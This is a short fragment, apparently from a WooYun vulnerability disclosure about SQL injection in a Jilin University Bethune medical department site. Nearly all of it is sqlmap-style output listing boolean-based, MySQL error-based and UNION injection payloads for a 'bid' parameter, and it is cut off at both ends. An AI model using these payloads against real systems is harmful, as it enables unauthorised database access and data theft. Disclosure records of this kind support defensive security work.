wybug_title: 吉林大学白求恩医学部SQL注射

WHERE or HAVING clause    Payload: bid=1 AND 4886=4886    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: bid=1 AND (SELECT 6995 FROM(SELECT COUNT(*),CONCAT(0x7173717671,(SELECT (CASE WHEN (6995=6995) THEN 1 ELSE 0 END)),0x71666a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)    Type: UNION query    Title: MySQL UNION query (NULL) -
